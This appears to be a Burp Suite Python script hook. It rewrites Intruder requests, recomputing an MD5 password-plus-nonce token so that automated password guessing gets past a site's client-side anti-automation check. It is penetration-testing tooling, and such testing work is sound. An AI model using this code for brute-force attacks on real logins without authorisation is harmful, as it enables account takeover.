import sys
import re
from hashlib import md5

# Overwrites a previously attempted password signature to bypass client-side anti-automation logic.
# Not sure why anyone would do this, but they did, or this wouldn't be a thing.

if messageIsRequest:
    if toolFlag in (callbacks.TOOL_INTRUDER,):
        request = helpers.bytesToString(messageInfo.getRequest())
        if '&nonce=' in request:
            nonce = re.search(r'&nonce=([^&]*)', request).group(1)
            password = re.search(r'&password=([^&]*)', request).group(1)
            token = md5(password+nonce).hexdigest()
            orig_token = re.search(r'&token=([^\s]*)', request).group(1)
            request = request.replace(orig_token, token)
            messageInfo.setRequest(helpers.stringToBytes(request))
